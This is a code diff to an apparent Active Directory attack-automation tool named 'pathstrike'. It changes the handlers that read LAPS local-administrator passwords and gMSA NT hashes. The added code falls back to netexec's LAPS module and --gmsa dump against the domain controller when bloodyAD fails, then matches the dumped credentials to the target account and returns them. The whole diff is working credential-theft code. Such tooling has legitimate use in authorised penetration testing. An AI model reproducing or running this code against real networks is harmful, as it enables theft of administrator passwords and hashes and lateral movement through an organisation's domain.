@@ -18,6 +18,7 @@ from pathstrike.models import (
     RollbackAction,
 )
 from pathstrike.tools import bloodyad_wrapper as bloody
+from pathstrike.tools import netexec_wrapper as nxc
 
 
 @register_handler("ReadLAPSPassword")
@@ -55,15 +56,34 @@ class ReadLAPSHandler(BaseEdgeHandler):
         self.logger.info("Reading LAPS password for %s", target)
         result = await bloody.read_laps(self.config, auth_args, target)
 
-        if not result["success"]:
-            return (
-                False,
-                f"Failed to read LAPS password for {target}: {result.get('error', 'unknown')}",
-                [],
-            )
+        laps_password = (
+            self._extract_laps_password(result) if result["success"] else None
+        )
 
-        # Parse the LAPS password from output
-        laps_password = self._extract_laps_password(result)
+        if not laps_password:
+            # Fallback: netexec's LAPS module (-M laps) queries the same
+            # ms-Mcs-AdmPwd / ms-LAPS-Password attributes via LDAP.
+            self.logger.info(
+                "bloodyAD LAPS read unavailable for %s; falling back to netexec laps",
+                target,
+            )
+            nxc_result = await nxc.dump_laps(
+                self._get_dc_host(), self._get_nxc_auth_args(principal)
+            )
+            laps_map = (nxc_result.get("parsed") or {}).get("laps_passwords", {})
+            short = target.split("@")[0].split(".")[0].rstrip("$").lower()
+            for computer, pw in laps_map.items():
+                if computer.split(".")[0].rstrip("$").lower() == short:
+                    laps_password = pw
+                    break
+            if not laps_password and not result["success"]:
+                return (
+                    False,
+                    f"Failed to read LAPS password for {target}: "
+                    f"{result.get('error', 'unknown')} "
+                    f"(netexec laps fallback: {nxc_result.get('error', 'no match')})",
+                    [],
+                )
 
         if not laps_password:
             return (
@@ -164,15 +184,31 @@ class ReadGMSAHandler(BaseEdgeHandler):
         self.logger.info("Reading gMSA password for %s", target)
         result = await bloody.read_gmsa(self.config, auth_args, target)
 
-        if not result["success"]:
-            return (
-                False,
-                f"Failed to read gMSA password for {target}: {result.get('error', 'unknown')}",
-                [],
-            )
+        nt_hash = self._extract_gmsa_hash(result) if result["success"] else None
 
-        # Extract the NT hash from the gMSA password blob
-        nt_hash = self._extract_gmsa_hash(result)
+        if not nt_hash:
+            # Fallback: netexec's --gmsa enumerates managed-password NT hashes.
+            self.logger.info(
+                "bloodyAD gMSA read unavailable for %s; falling back to netexec --gmsa",
+                target,
+            )
+            nxc_result = await nxc.dump_gmsa(
+                self._get_dc_host(), self._get_nxc_auth_args(principal)
+            )
+            gmsa_map = (nxc_result.get("parsed") or {}).get("gmsa", {})
+            short = target.split("@")[0].rstrip("$").lower()
+            for acct, nt in gmsa_map.items():
+                if acct.rstrip("$").lower() == short:
+                    nt_hash = nt
+                    break
+            if not nt_hash and not result["success"]:
+                return (
+                    False,
+                    f"Failed to read gMSA password for {target}: "
+                    f"{result.get('error', 'unknown')} "
+                    f"(netexec --gmsa fallback: {nxc_result.get('error', 'no match')})",
+                    [],
+                )
 
         if not nt_hash:
             return (
